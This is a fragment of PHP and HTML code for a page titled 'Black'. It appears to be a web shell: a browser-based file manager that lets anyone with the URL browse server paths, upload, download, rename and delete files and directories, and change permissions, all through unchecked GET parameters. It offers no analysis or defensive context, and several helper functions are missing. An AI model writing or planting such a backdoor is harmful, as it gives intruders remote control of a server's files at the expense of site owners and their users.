    ...
    <tbody>
        <tr>
            ...
            <div style='text-align:center;'>
                <a href='?' style='text-decoration:none;'><h1>Black</h1></a>
...
<?php
 if(isset($_GET['fpath']) && isset($_GET['rename'])) { rename_ui($_GET['fpath']); } else if(isset($_GET['old_name']) && isset($_GET['new_name']) && isset($_GET['fpath'])) { renamef($_GET['old_name'], $_GET['new_name']); } elseif (isset($_GET['delete']) && isset($_GET['fpath'])) { deleteFiled($_GET['delete']); } elseif (isset($_GET['deleteDir']) && isset($_GET['fpath'])) { if (file_exists($_GET['deleteDir'])) deleteDir($_GET['deleteDir'], $_GET['fpath']); } else if(isset($_GET['chperm']) && isset($_GET['fpath'])) { changeperm_ui($_GET['fpath']); } else if(isset($_GET['fname']) && isset($_GET['fpath']) && isset($_GET['new_perm'])) { changeperm(); } else if(isset($_GET['fpath']) && isset($_GET['upload'])) { uploadf($_GET['fpath']); } else if(isset($_GET['fpath']) && isset($_GET['createDir'])) { createDir($_GET['fpath'], $_GET['createDir']); } ftp_man_bg(); function ftp_man_bg() { global $fpath, $connect, $host; $path=!empty($_GET['path'])?$_GET['path']:getcwd(); $dirs=array(); $fils=array(); if(is_dir($path)) { chdir($path); if($handle=opendir($path)) { while(($item=readdir($handle))!==FALSE) { if($item=="."){continue;} if($item==".."){continue;} else { array_push($fils, $item); } } } } echo "<div id = resultx><br /><center><form method=GET>To Directory: <input name=fpath value='$fpath' size=65><input type=submit value='   Go   '></form><table class=tbl><tr><td><form enctype='multipart/form-data' method='post' action='?fpath=$fpath&amp;upload=1'>Upload: <input type='file' name='userfile'><input type=submit value=' Upload '></form></td><td><form method=GET><input name=fpath value='$fpath' type=hidden>Create Directory: <input name=createDir size=65><input type=submit value=' Create '></form></td></tr></table></div>"; echo "<div id=result><table class=table>
    <tr>
    ...
    </tr>"; $property = dirDetails($fpath); foreach ($property as $dirnumber => $prop) { global $fpath; $modified = $prop['time']; if($prop['type']=='Upfolder') { print "<tr><td><a href='?fpath=".realpath($fpath."/".$prop["name"])."'>[ ".$prop["name"]." ]</a></td><td>".""."</td><td>".$prop['size']."</td><td>".$modified."</td><td><a>".""."</a></td><td>".$prop['size']."</td></tr>"; } else if($prop['type']=='Directory') { print "<tr><td><a href='?fpath=".$fpath."/".$prop["name"]."'>[ ".$prop["name"]." ]</a></td><td>".$prop['type']."</td><td>".$prop['size']."</td><td>".$modified."</td><td><a href='?fpath=$fpath&amp;chperm=".$prop['name']."'>".$prop['perm']."</a></td><td><a href='?fpath=$fpath&amp;rename=".$prop['name']."'>Rename</a> | <a href='?fpath=$fpath&amp;deleteDir=".$prop['name']."'>Delete</a></td></tr>"; } else { print "<tr><td><a href='?fpath=$fpath&amp;fread=".$prop['name']."' target='_blank'>".$prop['name']."</a></td><td>".$prop['type']."</td><td>".filesizex($prop['size'])."</td><td>".$modified."</td><td><a href='?fpath=$fpath&amp;chperm=".$prop['name']."'>".$prop['perm']."</a></td><td><a href='?fpath=$fpath&amp;fopen=".$prop['name']."'>Download</a> | <a href='?fpath=$fpath&amp;rename=".$prop['name']."'>Rename</a> | <a href='?fpath=$fpath&amp;delete=".$prop['name']."'>Delete</a></td></tr>"; } } }